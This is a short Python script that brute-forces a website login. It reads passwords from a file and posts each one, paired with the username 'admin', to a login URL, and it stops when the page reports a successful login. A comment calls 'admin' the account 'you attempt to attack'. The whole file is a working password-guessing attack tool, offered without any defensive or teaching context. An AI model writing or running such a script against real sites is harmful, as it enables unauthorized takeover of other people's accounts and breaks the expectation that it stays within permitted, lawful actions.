import requests

# URL for the site
url = 'http://example.com/login'

# Username for the account you attempt to attack
username = 'admin'

# Read passwords from a file named 'passwords'
with open('passwords.txt', 'r') as file:
    passwords = file.readlines()


def attempt_login(password):
    payload = {
        'username': username,
        'password': password.strip()
    }

    response = requests.post(url, data=payload)

    if "Login successful" in response.text:
        print(f'Successful login with password: {password.strip()}')
        return True
    else:
        print(f'Failed login with password: {password.strip()}')
        return False

for password in passwords:
    if attempt_login(password):
        break
